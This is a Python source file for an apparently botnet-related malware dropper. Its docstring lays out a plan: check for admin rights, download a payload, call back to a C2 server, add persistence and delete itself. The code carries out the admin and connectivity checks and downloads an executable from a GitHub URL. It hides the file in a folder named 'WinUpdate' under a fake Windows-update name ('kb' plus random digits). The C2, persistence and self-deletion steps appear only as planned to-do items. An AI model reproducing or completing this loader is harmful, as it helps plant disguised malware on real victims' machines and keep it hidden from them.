"""
Always run on boot
[X] It will first check if ran as administrator, and has internet connectivity.
[] It will then download the payload hosted on github and save on disk.
[] It will then do a *callback to the C2 to establish alive.
[] It will then create persistence for the payload via [service | registry key].
[] Lastly, it will delete itself off the disk.
"""
import ctypes  # An included library with Python install.
import os
import time
import shutil
from threading import Thread

try:
    import _winreg as winreg
except ImportError:
    # this has been renamed in python 3
    import winreg
from urllib.request import urlopen
from urllib.error import URLError
from random import randint

PAYLOAD_URL = r"https://github.com/notclement/botnet-enumeration-network/raw/master/resources/payload.exe"
GOOGLE_DNS = 'http://www.google.com'
PATH_TO_HIDE = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))


def test_connectivity(google_dns):
    """Return True if there is internet connectivity.
    Returns False if there is no internet connectivity.
    """
    try:
        urlopen(google_dns, timeout=1)
        return True
    except URLError as err:
        return False


def test_is_admin():
    """Returns True if the program is ran as administrator.
    Returns False if not ran as administrator.
    """
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == 1:
        return True
    else:
        return False


def do_checks():
    """Does a series of checks including:
    1. checks if program is ran as administrator
    2. checks if there is internet connectivity
    returns True only when both are True
    """
    if test_is_admin() and test_connectivity(GOOGLE_DNS):
        return 1


def get_payload_to_path(payload_url, path_to_hide):
    """Reaches out to github to retrieve the payload"""
    full_path_to_hide = path_to_hide+"\\kb{}.exe".format(randint(1000000000,9999999999))
    print(full_path_to_hide)
    with urlopen(payload_url) as download_data, open(full_path_to_hide, 'wb') as exefile:
        data = download_data.read()
        exefile.write(data)


def main():
    if do_checks():
        print('Program is ran as administrator and has internet connectivity')
    get_payload_to_path(PAYLOAD_URL, PATH_TO_HIDE)


if __name__ == '__main__':
    main()
